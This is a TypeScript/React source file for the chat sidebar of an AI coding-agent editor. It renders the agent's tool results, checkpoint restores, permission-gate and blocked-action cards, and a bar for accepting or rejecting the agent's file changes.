				</ToolChildrenWrapper>
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />

		}
	},
	'ls_dir': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')
			const explorerService = accessor.get('IExplorerService')
			const title = getTitle(toolMessage)
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			if (params.uri) {
				const rel = getRelative(params.uri, accessor)
				if (rel) componentParams.info = `Only search in ${rel}`
			}

			if (toolMessage.type === 'success') {
				const { result } = toolMessage
				componentParams.numResults = result.children?.length
				componentParams.hasNextPage = result.hasNextPage
				componentParams.children = !result.children || (result.children.length ?? 0) === 0 ? undefined
					: <ToolChildrenWrapper>
						{result.children.map((child, i) => (<ListableToolItem key={i}
							name={`${child.name}${child.isDirectory ? '/' : ''}`}
							className='w-full overflow-auto'
							onClick={() => {
								vaderOpenFileFn(child.uri, accessor)
								// commandService.executeCommand('workbench.view.explorer'); // open in explorer folders view instead
								// explorerService.select(child.uri, true);
							}}
						/>))}
						{result.hasNextPage &&
							<ListableToolItem name={`Results truncated (${result.itemsRemaining} remaining).`} isSmall={true} className='w-full overflow-auto' />
						}
					</ToolChildrenWrapper>
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />
		}
	},
	'search_pathnames_only': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')
			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const title = getTitle(toolMessage)
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			if (params.includePattern) {
				componentParams.info = `Only search in ${params.includePattern}`
			}

			if (toolMessage.type === 'success') {
				const { result, rawParams } = toolMessage
				componentParams.numResults = result.uris.length
				componentParams.hasNextPage = result.hasNextPage
				componentParams.children = result.uris.length === 0 ? undefined
					: <ToolChildrenWrapper>
						{result.uris.map((uri, i) => (<ListableToolItem key={i}
							name={getBasename(uri.fsPath)}
							className='w-full overflow-auto'
							onClick={() => { vaderOpenFileFn(uri, accessor) }}
						/>))}
						{result.hasNextPage &&
							<ListableToolItem name={'Results truncated.'} isSmall={true} className='w-full overflow-auto' />
						}

					</ToolChildrenWrapper>
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />
		}
	},
	'search_for_files': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')
			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const title = getTitle(toolMessage)
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			if (params.searchInFolder || params.isRegex) {
				let info: string[] = []
				if (params.searchInFolder) {
					const rel = getRelative(params.searchInFolder, accessor)
					if (rel) info.push(`Only search in ${rel}`)
				}
				if (params.isRegex) { info.push(`Uses regex search`) }
				componentParams.info = info.join('; ')
			}

			if (toolMessage.type === 'success') {
				const { result, rawParams } = toolMessage
				componentParams.numResults = result.uris.length
				componentParams.hasNextPage = result.hasNextPage
				componentParams.children = result.uris.length === 0 ? undefined
					: <ToolChildrenWrapper>
						{result.uris.map((uri, i) => (<ListableToolItem key={i}
							name={getBasename(uri.fsPath)}
							className='w-full overflow-auto'
							onClick={() => { vaderOpenFileFn(uri, accessor) }}
						/>))}
						{result.hasNextPage &&
							<ListableToolItem name={`Results truncated.`} isSmall={true} className='w-full overflow-auto' />
						}

					</ToolChildrenWrapper>
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}
			return <ToolHeaderWrapper {...componentParams} />
		}
	},

	'search_in_file': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor();
			const toolsService = accessor.get('IToolsService');
			const title = getTitle(toolMessage);
			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor);
			const icon = null;

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const { rawParams, params } = toolMessage;
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected };

			const infoarr: string[] = []
			const uriStr = getRelative(params.uri, accessor)
			if (uriStr) infoarr.push(uriStr)
			if (params.isRegex) infoarr.push('Uses regex search')
			componentParams.info = infoarr.join('; ')

			if (toolMessage.type === 'success') {
				const { result } = toolMessage; // result is array of snippets
				componentParams.numResults = result.lines.length;
				componentParams.children = result.lines.length === 0 ? undefined :
					<ToolChildrenWrapper>
						<CodeChildren className='bg-vader-bg-3'>
							<pre className='font-mono whitespace-pre'>
								{toolsService.stringOfResult['search_in_file'](params, result)}
							</pre>
						</CodeChildren>
					</ToolChildrenWrapper>
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage;
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />;
		}
	},

	'read_lint_errors': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')

			const title = getTitle(toolMessage)

			const { uri } = toolMessage.params ?? {}
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			componentParams.info = getRelative(uri, accessor) // full path

			if (toolMessage.type === 'success') {
				const { result } = toolMessage
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) }
				if (result.lintErrors)
					componentParams.children = <LintErrorChildren lintErrors={result.lintErrors} />
				else
					componentParams.children = `No lint errors found.`

			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				// JumpToFileButton removed in favor of FileLinkText
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />
		},
	},

	// ---

	'create_file_or_folder': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')
			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const title = getTitle(toolMessage)
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const icon = null


			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			componentParams.info = getRelative(params.uri, accessor) // full path

			if (toolMessage.type === 'success') {
				const { result } = toolMessage
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) }
			}
			else if (toolMessage.type === 'rejected') {
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) }
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				if (params) { componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) } }
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}
			else if (toolMessage.type === 'running_now') {
				// nothing more is needed
			}
			else if (toolMessage.type === 'tool_request') {
				// nothing more is needed
			}

			return <ToolHeaderWrapper {...componentParams} />
		}
	},
	'delete_file_or_folder': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')
			const isFolder = toolMessage.params?.isFolder ?? false
			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const title = getTitle(toolMessage)
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const icon = null

			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			componentParams.info = getRelative(params.uri, accessor) // full path

			if (toolMessage.type === 'success') {
				const { result } = toolMessage
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) }
			}
			else if (toolMessage.type === 'rejected') {
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) }
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				if (params) { componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) } }
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}
			else if (toolMessage.type === 'running_now') {
				const { result } = toolMessage
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) }
			}
			else if (toolMessage.type === 'tool_request') {
				const { result } = toolMessage
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor) }
			}

			return <ToolHeaderWrapper {...componentParams} />
		}
	},
	'rewrite_file': {
		resultWrapper: (params) => {
			return <EditTool {...params} content={params.toolMessage.params.newContent} />
		}
	},
	'edit_file': {
		resultWrapper: (params) => {
			return <EditTool {...params} content={params.toolMessage.params.searchReplaceBlocks} />
		}
	},

	// ---

	'run_command': {
		resultWrapper: (params) => {
			return <CommandTool {...params} type='run_command' />
		}
	},

	'run_persistent_command': {
		resultWrapper: (params) => {
			return <CommandTool {...params} type='run_persistent_command' />
		}
	},
	'open_persistent_terminal': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const terminalToolsService = accessor.get('ITerminalToolService')

			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const title = getTitle(toolMessage)
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			const relativePath = params.cwd ? getRelative(URI.file(params.cwd), accessor) : ''
			componentParams.info = relativePath ? `Running in ${relativePath}` : undefined

			if (toolMessage.type === 'success') {
				const { result } = toolMessage
				const { persistentTerminalId } = result
				componentParams.desc1 = persistentTerminalNameOfId(persistentTerminalId)
				componentParams.onClick = () => terminalToolsService.focusPersistentTerminal(persistentTerminalId)
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />
		},
	},
	'kill_persistent_terminal': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')
			const terminalToolsService = accessor.get('ITerminalToolService')

			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const title = getTitle(toolMessage)
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			if (toolMessage.type === 'success') {
				const { persistentTerminalId } = params
				componentParams.desc1 = persistentTerminalNameOfId(persistentTerminalId)
				componentParams.onClick = () => terminalToolsService.focusPersistentTerminal(persistentTerminalId)
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />
		},
	},
};


// What the agent only looked at (reads, searches, folder listings) is folded into one line, "Explored 3 files, read 2, searched 1" (board R01); a click lists them.
const READ_TOOLS = new Set(['read_file', 'read_lint_errors'])
const SEARCH_TOOLS = new Set(['search_for_files', 'search_pathnames_only', 'search_in_file', 'codebase_search'])
const LIST_TOOLS = new Set(['ls_dir', 'get_dir_tree', 'repo_map'])
const isExploreMessage = (m: ChatMessage): m is ChatMessage & { role: 'tool' } => m.role === 'tool' && m.type === 'success' && (READ_TOOLS.has(m.name) || SEARCH_TOOLS.has(m.name) || LIST_TOOLS.has(m.name))
const NOISY_TOOLS = new Set(['edit_file', 'rewrite_file', 'update_task_list'])
const isQuietToolMessage = (m: ChatMessage) => m.role === 'tool' && m.type !== 'tool_request' && m.type !== 'invalid_params' && !(m.type === 'rejected' && m.gate) && !NOISY_TOOLS.has(m.name)
/** "read 2, searched 1, listed 1 folder" */
export const exploredWords = (names: readonly string[]): { headline: string, detail: string } => {
	const read = names.filter(n => READ_TOOLS.has(n)).length, searched = names.filter(n => SEARCH_TOOLS.has(n)).length, listed = names.filter(n => LIST_TOOLS.has(n)).length
	const detail = [read ? `read ${read}` : '', searched ? `searched ${searched}` : '', listed ? `listed ${listed} ${listed === 1 ? 'folder' : 'folders'}` : ''].filter(Boolean).join(', ')
	return { headline: `Explored ${names.length} ${listed > 0 ? (names.length === 1 ? 'place' : 'places') : (names.length === 1 ? 'file' : 'files')}`, detail }
}
const ExploredGroup = ({ items }: { items: { message: ChatMessage & { role: 'tool' }, node: React.ReactNode }[] }) => {
	const [open, setOpen] = useState(false)
	const words = exploredWords(items.map(x => x.message.name))
	return <div className='flex flex-col' data-testid='vader-explored'>
		<button type='button' aria-expanded={open} data-testid='vader-explored-toggle' onClick={() => setOpen(o => !o)} className='flex items-center gap-1.5 h-[22px] text-left text-vader-fg-3 hover:text-vader-fg-2 transition-colors duration-150'>
			<ChevronRight className={`h-3 w-3 flex-shrink-0 transition-transform duration-100 ${open ? 'rotate-90' : ''}`} />
			<span>{words.headline}</span>
			{words.detail ? <span className='ml-2 opacity-80'>{words.detail}</span> : null}
		</button>
		{open ? <div className='flex flex-col gap-0.5 pl-4' data-testid='vader-explored-list'>{items.map(x => x.node)}</div> : null}
	</div>
}

const Checkpoint = ({ message, threadId, messageIdx, isCheckpointGhost, threadIsRunning }: { message: CheckpointEntry, threadId: string; messageIdx: number, isCheckpointGhost: boolean, threadIsRunning: boolean }) => {
	const accessor = useAccessor()
	const chatThreadService = accessor.get('IChatThreadService')
	const streamState = useFullChatThreadsStreamState()

	const isRunning = useChatThreadsStreamState(threadId)?.isRunning
	const isDisabled = useMemo(() => {
		if (isRunning) return true
		return !!Object.keys(streamState).find((threadId2) => streamState[threadId2]?.isRunning)
	}, [isRunning, streamState])

	const num = useMemo(() => {
		const msgs = chatThreadService.state.allThreads[threadId]?.messages ?? []
		let n = 0
		for (let i = 0; i <= messageIdx && i < msgs.length; i++) if (msgs[i].role === 'checkpoint') n++
		return n
	}, [chatThreadService, threadId, messageIdx])
	const [asking, setAsking] = useState(false)
	const onAsk = () => {
		if (threadIsRunning) return
		if (isDisabled) return
		setAsking(true)
	}
	const onRestore = () => {
		setAsking(false)
		chatThreadService.jumpToCheckpointBeforeMessageIdx({
			threadId,
			messageIdx,
			jumpToUserModified: messageIdx === (chatThreadService.state.allThreads[threadId]?.messages.length ?? 0) - 1
		})
	}

	return <div className={`flex flex-col gap-2 px-1 text-xs text-vader-fg-3 select-none ${isCheckpointGhost ? 'opacity-50' : 'opacity-100'}`} data-testid='vader-checkpoint'>
		{asking ? <div className='rounded-xl border border-vader-border-2 bg-vader-bg-1 px-4 py-3 flex flex-col gap-2 text-[13px]' data-testid='vader-checkpoint-confirm' role='alertdialog'>
			<div className='font-semibold text-vader-fg-1 text-sm'>Go back to checkpoint {num}?</div>
			<div className='text-vader-fg-2 leading-relaxed'>Files return to how they were at this checkpoint. The messages after it stay visible but greyed out, and the next message continues from here.</div>
			<div className='flex gap-2 justify-end'>
				<button data-testid='vader-checkpoint-cancel' className='px-3 py-1 rounded-md text-sm border border-vader-border-2 text-vader-fg-1 hover:bg-vader-bg-2-hover' onClick={() => setAsking(false)}>Cancel</button>
				<button data-testid='vader-checkpoint-go' className='px-3 py-1 rounded-md bg-vader-fg-0 text-vader-bg-3 hover:opacity-90 text-sm font-medium' onClick={onRestore}>Go back</button>
			</div>
		</div> : null}
		<div className='flex items-center gap-3'>
		<span className='flex-1 h-px bg-vader-border-3' />
		<span>Checkpoint {num}</span>
		<span
			className={`underline underline-offset-[3px] text-vader-fg-2 ${isDisabled ? 'cursor-default opacity-60' : 'cursor-pointer hover:text-vader-fg-1'}`}
			data-testid='vader-checkpoint-restore'
			onClick={onAsk}
			{...isDisabled ? {
				'data-tooltip-id': 'vader-tooltip',
				'data-tooltip-content': `Disabled ${isRunning ? 'when running' : 'because another thread is running'}`,
				'data-tooltip-place': 'top',
			} : {}}
		>Restore</span>
		<span className='flex-1 h-px bg-vader-border-3' />
		</div>
	</div>
}


type ChatBubbleMode = 'display' | 'edit'
type ChatBubbleProps = {
	chatMessage: ChatMessage,
	messageIdx: number,
	isCommitted: boolean,
	chatIsRunning: IsRunningType,
	threadId: string,
	currCheckpointIdx: number | undefined,
	_scrollToBottom: (() => void) | null,
}

const ChatBubble = (props: ChatBubbleProps) => {
	return <ErrorBoundary>
		<_ChatBubble {...props} />
	</ErrorBoundary>
}

const _ChatBubble = ({ threadId, chatMessage, currCheckpointIdx, isCommitted, messageIdx, chatIsRunning, _scrollToBottom }: ChatBubbleProps) => {
	const role = chatMessage.role

	const isCheckpointGhost = messageIdx > (currCheckpointIdx ?? Infinity) && !chatIsRunning // whether to show as gray (if chat is running, for good measure just dont show any ghosts)

	if (role === 'user') {
		return <UserMessageComponent
			threadId={threadId}
			chatMessage={chatMessage}
			isCheckpointGhost={isCheckpointGhost}
			currCheckpointIdx={currCheckpointIdx}
			messageIdx={messageIdx}
			_scrollToBottom={_scrollToBottom}
		/>
	}
	else if (role === 'assistant') {
		return <AssistantMessageComponent
			threadId={threadId}
			chatMessage={chatMessage}
			isCheckpointGhost={isCheckpointGhost}
			messageIdx={messageIdx}
			isCommitted={isCommitted}
		/>
	}
	else if (role === 'tool') {

		if (chatMessage.type === 'invalid_params') {
			return <div className={`${isCheckpointGhost ? 'opacity-50' : ''}`}>
				<InvalidTool toolName={chatMessage.name} message={chatMessage.content} mcpServerName={chatMessage.mcpServerName} />
			</div>
		}

		const toolName = chatMessage.name
		const isBuiltInTool = isABuiltinToolName(toolName)
		const ToolResultWrapper = isBuiltInTool ? (builtinToolNameToComponent[toolName]?.resultWrapper ?? GenericToolWrapper) as ResultWrapper<ToolName>
			: MCPToolWrapper as ResultWrapper<ToolName>

		if (ToolResultWrapper)
			// something the person is asked to allow is one card: what it is and in which mode it asks, what exactly it does, and the buttons (boards R07, S02)
			if (chatMessage.type === 'tool_request') {
				return <GateCard toolName={chatMessage.name} params={chatMessage.params} mcpServerName={chatMessage.mcpServerName} gate={chatMessage.gate} isCheckpointGhost={isCheckpointGhost}
					extra={chatMessage.gate ? null : <AutoApproveToggle toolName={chatMessage.name} />}>
					<ToolResultWrapper
						toolMessage={chatMessage}
						messageIdx={messageIdx}
						threadId={threadId}
					/>
				</GateCard>
			}
			// something the gate refused is one card too: what did not run, and the rule, the scope or the mode that said so
			if (chatMessage.type === 'rejected' && chatMessage.gate) {
				return <BlockedCard toolName={chatMessage.name} params={chatMessage.params} mcpServerName={chatMessage.mcpServerName} gate={chatMessage.gate} isCheckpointGhost={isCheckpointGhost} />
			}
			return <div className={`${isCheckpointGhost ? 'opacity-50' : ''}`}>
				<ToolResultWrapper
					toolMessage={chatMessage}
					messageIdx={messageIdx}
					threadId={threadId}
				/>
			</div>
		return null
	}

	else if (role === 'interrupted_streaming_tool') {
		return <div className={`${isCheckpointGhost ? 'opacity-50' : ''}`}>
			<CanceledTool toolName={chatMessage.name} mcpServerName={chatMessage.mcpServerName} />
		</div>
	}

	else if (role === 'checkpoint') {
		return <Checkpoint
			threadId={threadId}
			message={chatMessage}
			messageIdx={messageIdx}
			isCheckpointGhost={isCheckpointGhost}
			threadIsRunning={!!chatIsRunning}
		/>
	}

	else if (role === 'compacted_summary') {
		return <div className={`my-2 px-2 py-1.5 rounded text-xs text-vader-fg-3 bg-vader-bg-2 border border-vader-border-3 ${isCheckpointGhost ? 'opacity-50' : ''}`}>
			<div className='font-medium'>Earlier context compacted ({chatMessage.originalMessageCount} messages condensed)</div>
			{chatMessage.summary.objective ? <div className='mt-0.5 opacity-80'>{chatMessage.summary.objective}</div> : null}
		</div>
	}

}

/** the files this task has changed and not yet settled (they wait in the editor): one quiet row above the box with Reject all and Accept all, and the files under it when opened */
const CommandBarInChat = () => {
	const { stateOfURI: commandBarStateOfURI, sortedURIs: sortedCommandBarURIs } = useCommandBarState()
	const numFilesChanged = sortedCommandBarURIs.length

	const accessor = useAccessor()
	const editCodeService = accessor.get('IEditCodeService')
	const [opened, setOpened] = useState(false)

	if (numFilesChanged === 0) return null // nothing changed: no bar, so the message box is not crowded by an empty one

	const settle = (uri: URI | undefined, behavior: 'accept' | 'reject') => {
		const list = uri ? [uri] : sortedCommandBarURIs
		list.forEach(u => { editCodeService.acceptOrRejectAllDiffAreas({ uri: u, removeCtrlKs: true, behavior, _addToHistory: true }) })
	}
	const writing = sortedCommandBarURIs.some(uri => commandBarStateOfURI[uri.fsPath]?.isStreaming)
	const word = `${numFilesChanged} file${numFilesChanged === 1 ? '' : 's'} with changes`

	return <div className='flex flex-col rounded-[10px] border border-vader-border-3 bg-vader-bg-1 overflow-hidden select-none' data-testid='vader-files-bar'>
		<div className='flex items-center gap-2 h-8 pl-3 pr-1.5 text-[12.5px] text-vader-fg-2'>
			<button type='button' aria-expanded={opened} data-testid='vader-files-toggle' onClick={() => setOpened(o => !o)} className='flex items-center gap-1.5 h-full hover:text-vader-fg-1 transition-colors duration-150'>
				<ChevronRight className={`h-3 w-3 flex-shrink-0 transition-transform duration-100 ${opened ? 'rotate-90' : ''}`} />
				<span>{word}</span>
			</button>
			<span className='flex-1' />
			{writing ? <span className='text-vader-fg-3 text-xs pr-2' data-testid='vader-files-writing'>Writing</span> : <>
				<button type='button' data-testid='vader-reject-all' onClick={() => settle(undefined, 'reject')} className='h-6 px-2 rounded-md text-vader-fg-2 hover:text-vader-fg-1 transition-colors duration-150'>Reject all</button>
				<button type='button' data-testid='vader-accept-all' onClick={() => settle(undefined, 'accept')} className='h-6 px-2.5 rounded-md font-semibold bg-vader-fg-0 text-vader-bg-3 hover:opacity-90 transition-opacity duration-150'>Accept all</button>
			</>}
		</div>
		{opened ? <div className='flex flex-col border-t border-vader-border-3 py-1' data-testid='vader-files-list'>
			{sortedCommandBarURIs.map((uri, i) => {
				const { sortedDiffIds, isStreaming } = commandBarStateOfURI[uri.fsPath] ?? {}
				const numDiffs = sortedDiffIds?.length || 0
				return <div key={i} className='flex items-center gap-2 h-7 pl-3 pr-1.5 text-[12.5px]'>
					<button type='button' className='font-mono text-[12px] text-vader-fg-2 hover:text-vader-fg-1 truncate text-left transition-colors duration-150' title={uri.fsPath} onClick={() => vaderOpenFileFn(uri, accessor)}>{getBasename(uri.fsPath)}</button>
					<span className='text-vader-fg-3 text-xs whitespace-nowrap'>{numDiffs} change{numDiffs === 1 ? '' : 's'}</span>
					<span className='flex-1' />
					{isStreaming ? <span className='text-vader-fg-3 text-xs pr-2'>Writing</span> : <>
						<button type='button' onClick={() => settle(uri, 'reject')} className='h-6 px-2 rounded-md text-vader-fg-2 hover:text-vader-fg-1 transition-colors duration-150'>Reject</button>
						<button type='button' onClick={() => settle(uri, 'accept')} className='h-6 px-2 rounded-md text-vader-fg-1 border border-vader-border-2 hover:bg-vader-bg-2-hover transition-colors duration-150'>Accept</button>
					</>}
				</div>
			})}
		</div> : null}
	</div>
}



const EditToolSoFar = ({ toolCallSoFar, }: { toolCallSoFar: RawToolCallObj }) => {

	if (!isABuiltinToolName(toolCallSoFar.name)) return null

	const accessor = useAccessor()

	const uri = toolCallSoFar.rawParams.uri ? URI.file(toolCallSoFar.rawParams.uri) : undefined

	const title = titleOfBuiltinToolName[toolCallSoFar.name].proposed

	const uriDone = toolCallSoFar.doneParams.includes('uri')
	const desc1 = <span className='flex items-center'>
		{uriDone ?
			getBasename(toolCallSoFar.rawParams['uri'] ?? 'unknown')
			: `Generating`}
		<IconLoading />
	</span>

	const desc1OnClick = () => { uri && vaderOpenFileFn(uri, accessor) }

	// If URI has not been specified
	return <ToolHeaderWrapper
		title={title}
		desc1={desc1}
		desc1OnClick={desc1OnClick}
	>
		<EditToolChildren
			uri={uri}
			code={toolCallSoFar.rawParams.search_replace_blocks ?? toolCallSoFar.rawParams.new_content ?? ''}
			type={'rewrite'} // as it streams, show in rewrite format, don't make a diff editor
		/>
		<IconLoading />
	</ToolHeaderWrapper>

}


export const SidebarChat = () => {
	const textAreaRef = useRef<HTMLTextAreaElement | null>(null)
	const textAreaFnsRef = useRef<TextAreaFns | null>(null)

	const accessor = useAccessor()
	const commandService = accessor.get('ICommandService')
	const chatThreadsService = accessor.get('IChatThreadService')
	const agentGatewayService = accessor.get('IAgentGatewayService')
	const vaderSettingsService = accessor.get('IVaderSettingsService')

	const settingsState = useSettingsState()
	// ----- HIGHER STATE -----
	const composerRef = useCallback((node: HTMLTextAreaElement | null) => {
		textAreaRef.current = node
		if (node) node.setAttribute('aria-label', translateText('Describe the task', settingsState.globalSettings.uiLanguage) ?? 'Describe the task')
	}, [settingsState.globalSettings.uiLanguage])

	// threads state
	const chatThreadsState = useChatThreadsState()

	const currentThread = chatThreadsService.getCurrentThread()
	const composerThreadId = currentThread.id
	const previousMessages = currentThread?.messages ?? []

	const selections = currentThread.state.stagingSelections
	const setSelections = useCallback((s: StagingSelectionItem[]) => { chatThreadsService.setThreadComposerState(composerThreadId, { stagingSelections: s }) }, [chatThreadsService, composerThreadId])

	// stream state
	const currThreadStreamState = useChatThreadsStreamState(chatThreadsState.currentThreadId)
	const isRunning = currThreadStreamState?.isRunning
	const latestError = currThreadStreamState?.error
	const { displayContentSoFar, toolCallSoFar, reasoningSoFar } = currThreadStreamState?.llmInfo ?? {}

	// this is just if it's currently being generated, NOT if it's currently running
	const toolIsGenerating = toolCallSoFar && !toolCallSoFar.isDone // show loading for slow tools (right now just edit)

	// ----- SIDEBAR CHAT state (local) -----

	// state of current message
	const initVal = ''
	const [instructionsAreEmpty, setInstructionsAreEmpty] = useState(!initVal)
	// long pasted texts are folded to one line each above the message box, and sent in full with the message
	const pastes = currentThread.state.composerAttachments ?? []
	const setPastes: React.Dispatch<React.SetStateAction<Paste[]>> = useCallback(update => {
		const draft = chatThreadsService.state.allThreads[composerThreadId]?.state.composerAttachments ?? []
		chatThreadsService.setThreadComposerState(composerThreadId, { composerAttachments: typeof update === 'function' ? update(draft) : update })
	}, [chatThreadsService, composerThreadId])
	// images attached to the message: they go to the model that was chosen, and only to it (common/imageRules.ts)
	const images = currentThread.state.composerImages ?? []
	const setImages: React.Dispatch<React.SetStateAction<ChatImage[]>> = useCallback(update => {
		const draft = chatThreadsService.state.allThreads[composerThreadId]?.state.composerImages ?? []
		chatThreadsService.setThreadComposerState(composerThreadId, { composerImages: typeof update === 'function' ? update(draft) : update })
	}, [chatThreadsService, composerThreadId])
	// a key found in the message that was about to be sent: it is not sent (board S02)
	const [secretHits, setSecretHits] = useState<SecretHit[] | null>(null)
	const [preparingThreads, setPreparingThreads] = useState<ReadonlySet<string>>(new Set())

	// a coding agent chosen for the chat brings its own model, so no model has to be configured
	const noModel = !settingsState.globalSettings.externalAgentId && !!isFeatureNameDisabled('Chat', settingsState)
	const isDisabled = (instructionsAreEmpty && pastes.length === 0 && images.length === 0) || noModel || preparingThreads.has(composerThreadId) || !!currThreadStreamState?.isPreparing

	// a message with images needs a model that reads them; a connected agent's own model is not known here, so it is not offered images
	const chatModel = settingsState.modelSelectionOfFeature?.Chat
	const modelSeesImages = !settingsState.globalSettings.externalAgentId && !!chatModel && modelSupportsVision(chatModel.providerName, chatModel.modelName)
	const imagesBlocked = images.length > 0 && !modelSeesImages

	const sidebarRef = useRef<HTMLDivElement>(null)
	// in a narrow panel (the side bar of the editor) the columns keep less room around them
	const [compact, setCompact] = useState(false)
	const showingLanding = previousMessages.length === 0
	useEffect(() => {
		const el = sidebarRef.current
		if (!el || typeof ResizeObserver === 'undefined') return
		const measure = () => setCompact(el.clientWidth < 520)
		measure()
		const ro = new ResizeObserver(measure)
		ro.observe(el)
		return () => ro.disconnect()
	}, [showingLanding])
	const scrollContainerRef = useRef<HTMLDivElement | null>(null)
	const pendingSends = useRef(new Set<string>())
